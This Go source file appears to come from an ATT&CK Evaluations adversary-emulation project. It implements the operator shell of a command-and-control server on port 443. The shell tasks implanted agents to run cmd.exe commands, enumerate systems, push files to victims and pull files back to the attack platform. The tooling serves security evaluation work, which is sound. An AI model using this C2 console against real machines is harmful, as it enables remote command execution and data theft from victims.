package cli

import (
	"fmt"
	"io/ioutil"
	"log"
	"path/filepath"
	"strings"

	"github.com/abiosoft/ishell"
	"github.com/fatih/color"
	"gitlab.mitre.org/mlong/carbon-ack/httpserver"
)

// LHOST defines the C2 server listening IP address and port
var LHOST string = "0.0.0.0:443"

// Start executes the interactive shell
func Start() {
	shell := ishell.New()
	shell.SetPrompt("(ATT&CK Evals)> ")

	// send agent taskings to C2 server
	shell.AddCmd(&ishell.Cmd{
		Name:    "exec-cmd",
		Aliases: []string{"exec", "shell", "run"},
		Help:    "Task agent to execute a cmd.exe command",
		Func: func(c *ishell.Context) {
			execCommand(strings.Join(c.Args, " "))
		},
	})

	shell.AddCmd(&ishell.Cmd{
		Name:    "enum-system",
		Aliases: []string{"enum", "sysinfo"},
		Help:    "Task agent to run system enumeration commands",
		Func: func(c *ishell.Context) {
			execEnum()
		},
	})

	shell.AddCmd(&ishell.Cmd{
		Name:    "exit",
		Aliases: []string{"quit", "q!"},
		Help:    "Exit program",
		Func: func(c *ishell.Context) {
			shell.Stop()
		},
	})

	shell.AddCmd(&ishell.Cmd{
		Name:    "list-sessions",
		Aliases: []string{"agents", "sessions", "list"},
		Help:    "List agent sessions",
		Func: func(c *ishell.Context) {
			listSession()
		},
	})

	// handle file uploads
	shell.AddCmd(&ishell.Cmd{
		Name:    "upload-file",
		Aliases: []string{"upload", "uf"},
		Help:    "upload-file \"/path/to/file.txt\" \"C:\\Windows\\Temp\\file.txt\"",
		Func: func(c *ishell.Context) {
			if len(c.Args) < 2 {
				c.Println("Usage: upload-file \"/path/to/file.txt\" \"C:\\\\Windows\\\\Temp\\\\file.txt\"")
				return
			}
			uploadFile(c.Args[0], c.Args[1])
		},
	})

	// handle file downloads
	shell.AddCmd(&ishell.Cmd{
		Name:    "download-file",
		Aliases: []string{"download", "dl"},
		Help:    "download-file \"C:\\Windows\\Temp\\file.txt\" \"/path/to/file.txt\"",
		Func: func(c *ishell.Context) {
			if len(c.Args) < 1 {
				c.Println("Usage: download-file \"C:\\Windows\\Temp\\file.txt\" \"/path/to/file.txt\"")
				return
			}
			downloadFile(c.Args[0], c.Args[1])
		},
	})

	shell.Run()
}

func execCommand(cmd string) {
	err := ioutil.WriteFile("tasking.html", []byte(cmd), 0644)
	if err != nil {
		log.Fatal(err)
	}
	s := "[i] Queued tasking: " + cmd
	log.Println(color.CyanString(s))
}

func execEnum() {
	cmd := "enum-system"
	err := ioutil.WriteFile("tasking.html", []byte(cmd), 0644)
	if err != nil {
		log.Fatal(err)
	}
	s := "[i] Queued tasking: " + cmd
	log.Println(color.CyanString(s))
}

func uploadFile(src, dst string) {
	// copy source file to downloads directory
	srcFile, err := ioutil.ReadFile(src)
	if err != nil {
		log.Println(err)
		return
	}
	tempFileWrite := "./download/" + filepath.Base(src)
	err = ioutil.WriteFile(tempFileWrite, srcFile, 0755)
	if err != nil {
		log.Println(err)
		return
	}
	// issue download task
	delimiter := " "
	downloadInstructions := "download" + delimiter + "/download/" + filepath.Base(src) + delimiter + dst
	err = ioutil.WriteFile("tasking.html", []byte(downloadInstructions), 0644)
	if err != nil {
		log.Println(err)
		return
	}
}

// download file from victim to attack platform (temp directory)
func downloadFile(src, dst string) {
	// tell agent to upload file to server
	delimiter := " "
	downloadInstructions := "upload" + delimiter + "upload.html" + delimiter + filepath.Base(src)
	log.Println(downloadInstructions)
	err := ioutil.WriteFile("tasking.html", []byte(downloadInstructions), 0644)
	if err != nil {
		log.Println(err)
		return
	}
	err = ioutil.WriteFile("dstFile.txt", []byte(dst), 0644)
	if err != nil {
		log.Println(err)
	}
	fmt.Println("File contents:")
	fmt.Println(string(dst))
}

func listSession() {
	fmt.Println()
	log.Println("Sorry, this feature isn't developed yet :(")
	for _, session := range httpserver.SessionList {
		fmt.Println(session)
	}
}
